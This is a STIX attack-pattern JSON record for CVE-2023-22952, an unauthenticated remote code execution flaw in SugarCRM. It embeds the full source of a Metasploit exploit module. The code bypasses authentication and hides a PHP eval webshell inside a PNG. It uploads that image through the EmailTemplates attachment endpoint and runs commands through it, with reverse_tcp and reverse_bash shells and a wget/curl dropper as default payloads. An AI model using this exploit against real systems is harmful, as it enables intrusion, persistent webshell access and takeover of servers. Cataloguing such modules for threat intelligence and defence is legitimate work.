{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5f1d6fbd-4b04-44ad-804f-5bb7650cd1c0",
    "created": "2024-08-14T17:10:44.018246Z",
    "modified": "2024-08-14T17:10:44.01825Z",
    "name": "SugarCRM unauthenticated Remote Code Execution (RCE)",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/sugarcrm_webshell_cve_2023_22952.rb",
            "external_id": "sugarcrm_webshell_cve_2023_22952.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-22952"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2022/Dec/31"
        },
        {
            "source_name": "reference",
            "url": "https://support.sugarcrm.com/Resources/Security/sugarcrm-sa-2023-001/"
        },
        {
            "source_name": "reference",
            "url": "https://sugarclub.sugarcrm.com/engage/b/sugar-news/posts/jan-5-2023-security-vulnerability-update"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/E486ui94II/cve-2023-22952"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'securerandom'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Format::PhpPayloadPng\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'SugarCRM unauthenticated Remote Code Execution (RCE)',\n        'Description' => %q{\n          This module exploits CVE-2023-22952, a Remote Code Execution (RCE) vulnerability in SugarCRM 11.0 Enterprise,\n          Professional, Sell, Serve, and Ultimate versions prior to 11.0.5 and SugarCRM 12.0 Enterprise, Sell, and\n          Serve versions prior to 12.0.2.\n\n          The vulnerability occurs due to a lack of appropriate validation when uploading a malicious PNG file with\n          embedded PHP code to the /cache/images/ directory on the web server using the vulnerable endpoint\n          /index.php?module=EmailTemplates&action=AttachFiles. Once uploaded to the server, depending on server configuration,\n          the attacker can access the malicious PNG file via HTTP or HTTPS, thereby executing the malicious PHP code and\n          gaining access to the system.\n\n          This vulnerability does not require authentication because there is a missing authentication check in the\n          loadUser() method in include/MVC/SugarApplication.php. After a failed login, the session does not get\n          destroyed and hence the attacker can continue to send valid requests to the application.\n\n          Because of this, any remote attacker, regardless of authentication, can exploit this vulnerability to gain\n          access to the underlying operating system as the user that the web services are running as (typically www-data).\n        },\n        'Author' => [\n          'Sw33t.0day', # discovery\n          'h00die-gr3y <h00die.gr3y[at]gmail.com>' # Metasploit module\n        ],\n        'References' => [\n          [ 'CVE', '2023-22952' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2022/Dec/31' ],\n          [ 'URL', 'https://support.sugarcrm.com/Resources/Security/sugarcrm-sa-2023-001/' ],\n          [ 'URL', 'https://sugarclub.sugarcrm.com/engage/b/sugar-news/posts/jan-5-2023-security-vulnerability-update' ],\n          [ 'URL', 'https://attackerkb.com/topics/E486ui94II/cve-2023-22952' ],\n          [ 'PACKETSTORM', '170346' ]\n        ],\n        'License' => MSF_LICENSE,\n        'Platform' => [ 'unix', 'linux', 'php' ],\n        'Privileged' => false,\n        'Arch' => [ ARCH_CMD, ARCH_PHP, ARCH_X64, ARCH_X86 ],\n        'Targets' => [\n          [\n            'PHP',\n            {\n              'Platform' => 'php',\n              'Arch' => ARCH_PHP,\n              'Type' => :php,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'php/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_bash'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ ARCH_X64, ARCH_X86 ],\n              'Type' => :linux_dropper,\n              'CmdStagerFlavor' => [ 'wget', 'curl', 'printf', 'bourne' ],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2022-12-28',\n        'DefaultOptions' => {\n          'SSL' => false,\n          'RPORT' => 80\n        },\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],\n          'Reliability' => [ REPEATABLE_SESSION ]\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, 'SugarCRM base url', '/' ]),\n        OptString.new('WEBSHELL', [\n          false, 'The name of the webshell with extension to trick the parser like .phtml, .phar, etc. Webshell name will be randomly generated if left unset.', ''\n        ]),\n        OptEnum.new('COMMAND', [ true, 'Use PHP command function', 'passthru', [ 'passthru', 'shell_exec', 'system', 'exec' ]], conditions: %w[TARGET != 0])\n      ]\n    )\n  end\n\n  def authenticate\n    # generate PHP session-id\n    @phpsessid = \"PHPSESSID=#{SecureRandom.uuid}\"\n\n    # randomize user and password to obfuscate and make finger printing difficult.\n    user_name = Rex::Text.rand_name\n    user_password = Rex::Text.rand_text_alphanumeric(8..16)\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(datastore['TARGETURI'], 'index.php'),\n      'cookie' => @phpsessid.to_s,\n      'ctype' => 'application/x-www-form-urlencoded',\n      'vars_post' => {\n        'module' => 'Users',\n        'action' => 'Authenticate',\n        'user_name' => user_name.to_s,\n        'user_password' => user_password.to_s\n      }\n    })\n    if res && res.code == 500 && !res.body.blank?\n      return true\n    else\n      return false\n    end\n  end\n\n  def upload_webshell\n    # randomize file name and extension if option WEBSHELL is not set\n    file_ext = ['phar', 'phtml']\n    if datastore['WEBSHELL'].blank?\n      @webshell_name = \"#{Rex::Text.rand_text_alpha(8..16)}.#{file_ext.sample}\"\n    else\n      @webshell_name = datastore['WEBSHELL'].to_s\n    end\n\n    # select webshell depending on the target setting (PHP or others).\n    @post_param = Rex::Text.rand_text_alphanumeric(1..8)\n    @get_param = Rex::Text.rand_text_alphanumeric(1..8)\n\n    if target['Type'] == :php\n      payload = \"<?php @eval(base64_decode($_POST[\\'#{@post_param}\\']));?>\"\n    else\n      payload = \"<?=$_GET[\\'#{@get_param}\\'](base64_decode($_POST[\\'#{@post_param}\\']));?>\"\n    end\n\n    # inject PHP payload into the PLTE chunk of the PNG image\n    png_webshell = inject_php_payload_png(payload, injection_method: 'PLTE')\n    if png_webshell.nil?\n      return false\n    end\n\n    # construct multipart form data\n    form_data = Rex::MIME::Message.new\n    form_data.add_part('AttachFiles', nil, nil, 'form-data; name=\"action\"')\n    form_data.add_part('EmailTemplates', nil, nil, 'form-data; name=\"module\"')\n    form_data.add_part(png_webshell.to_s, 'image/png', 'binary', \"form-data; name=\\\"file\\\"; filename=\\\"#{@webshell_name}\\\"\")\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(datastore['TARGETURI'], 'index.php'),\n      'cookie' => @phpsessid.to_s,\n      'ctype' => \"multipart/form-data; boundary=#{form_data.bound}\",\n      'data' => form_data.to_s\n    })\n    if res && res.code == 200 && !res.body.blank?\n      # parse HTML to find the webshell name embedded in a table that indicates a successful upload\n      html = res.get_html_document\n      if html.at(\"td[contains(\\\"#{@webshell_name}\\\")]\")\n        return true\n      else\n        return false\n      end\n    else\n      return false\n    end\n  end\n\n  def execute_php(cmd, _opts = {})\n    payload = Base64.strict_encode64(cmd)\n    return send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(datastore['TARGETURI'], 'cache', 'images', @webshell_name),\n      'cookie' => @phpsessid.to_s,\n      'ctype' => 'application/x-www-form-urlencoded',\n      'vars_post' => {\n        @post_param => payload\n      }\n    })\n  end\n\n  def execute_command(cmd, _opts = {})\n    payload = Base64.strict_encode64(cmd)\n    php_cmd_function = datastore['COMMAND']\n    return send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(datastore['TARGETURI'], 'cache', 'images', @webshell_name),\n      'cookie' => @phpsessid.to_s,\n      'ctype' => 'application/x-www-form-urlencoded',\n      'vars_get' => {\n        @get_param => php_cmd_function\n      },\n      'vars_post' => {\n        @post_param => payload\n      }\n    })\n  end\n\n  def exploit\n    fail_with(Failure::NoAccess, 'Authentication bypass failed.') unless authenticate\n    fail_with(Failure::NotVulnerable, \"Webshell #{@webshell_name} upload failed, the system is likely patched.\") unless upload_webshell\n    register_file_for_cleanup(@webshell_name.to_s)\n\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n    case target['Type']\n    when :php\n      execute_php(payload.encoded)\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager(linemax: 65536)\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2022-12-28",
    "x_mitre_platforms": [
        "linux'"
    ]
}